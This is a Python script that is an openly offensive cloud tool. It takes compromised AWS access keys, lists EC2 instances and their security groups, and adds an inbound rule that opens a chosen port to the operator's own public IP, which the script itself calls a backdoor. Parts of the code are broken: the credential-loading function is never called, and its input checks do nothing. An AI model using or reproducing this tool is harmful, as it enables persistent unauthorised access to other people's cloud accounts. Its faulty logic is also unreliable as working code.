import json, requests, sys, time
from prettytable import PrettyTable
from boto3.session import Session

def connect_to_aws():
    global session

    access_key = input("Copy and paste the compromised AWS access key ID here: ")
    secret_key = input("Copy and paste the compromised AWS secret access key here: ")
    region = input("Enter a region here: ")

    while True:
        try:
            aws_regions = [
                'ap-east-1', 'ap-northeast-1', 'ap-northeast-2', 'ap-south-1', 'ap-southeast-1', 'ap-southeast-2', 'ca-central-1', 
                'cn-north-1', 'cn-northwest-1', 'eu-central-1', 'eu-north-1', 'eu-west-1', 'eu-west-2', 'eu-west-3', 
                'sa-east-1', 'us-east-1', 'us-east-2', 'us-gov-east-1', 'us-gov-west-1', 'us-west-1', 'us-west-2'
            ]
            region in aws_regions
            break
        except ValueError:
            print("Enter a valid AWS region.")

    session = Session(
        aws_access_key_id='{}'.format(access_key),
        aws_secret_access_key='{}'.format(secret_key),
        region_name='{}'.format(region)
    )

def select_security_group():
    global ec2_client, public_ip, selected_security_group

    ec2_client = session.client('ec2')
    public_ip = requests.get('http://ip.42.pl/raw').text

    ec2_instances = ec2_client.describe_instances()['Reservations']
    ec2_security_group_list = []
    sg_table = PrettyTable(['EC2 Instance ID', 'Security Group ID', 'Port', 'Protocol', 'CIDR IP Address Range'])

    for i in range(len(ec2_instances)):
        ec2_security_groups = ec2_instances[i]['Instances'][0]['SecurityGroups'][0]['GroupId']
        ec2_security_group_list.append(ec2_security_groups)
        ip_permissions = ec2_client.describe_security_groups(GroupIds = [ec2_security_groups])['SecurityGroups'][0]['IpPermissions']

        for j in range(len(ip_permissions)):
            ports = ip_permissions[j]['FromPort']
            protocols = ip_permissions[j]['IpProtocol']
            cidr_ips = ip_permissions[j]['IpRanges'][0]['CidrIp']

            sg_table.add_row([
                ec2_instances[i]['Instances'][0]['InstanceId'],
                ec2_security_groups,
                ports,
                protocols,
                cidr_ips
                ]
            )

    print(sg_table)

    selected_security_group = input('Copy and paste the security group to backdoor into: ')

    while True:
        try:
            selected_security_group = str(selected_security_group)
            break
        except ValueError:
            print("This is not a string.")
        try:
            selected_security_group in ec2_security_group_list
            break
        except ValueError:
            print("This is not a valid security group.")

def create_inbound_rule():
    common_ports = [20, 21, 22, 23, 25, 53, 67, 68, 69, 80, 110, 123, 389, 443, 3389]
    selected_port = input('Enter a port number to backdoor into: ')
    while True:
        try:
            selected_port = int(selected_port)
            break
        except ValueError:
            print("Enter a number.")
        try:
            selected_port in common_ports
            break
        except ValueError:
            print("Enter a common port number.")

    selected_protocol = input('Enter a protocol to backdoor into: ')
    while True:
        try:
            selected_protocol = str(selected_protocol)
            break
        except ValueError:
            print("Enter a string.")
        try:
            selected_protocol == 'tcp' or 'TCP' or 'udp' or 'UDP'
            break
        except ValueError:
            print("Enter either 'tcp' or 'udp'.")

    ec2_client.authorize_security_group_ingress(
        GroupId = selected_security_group,
        IpProtocol = selected_protocol,
        FromPort = selected_port,
        ToPort = selected_port,
        CidrIp = '{}/32'.format(public_ip)
    )

def view_metadata():
    print(json.dumps(
        ec2_client.describe_security_groups(GroupIds = [selected_security_group])['SecurityGroups'][0]['IpPermissions'][0],
        indent = 1,
        default = str)
    )

if __name__ == "__main__":
    select_security_group()
    create_inbound_rule()
    view_metadata()
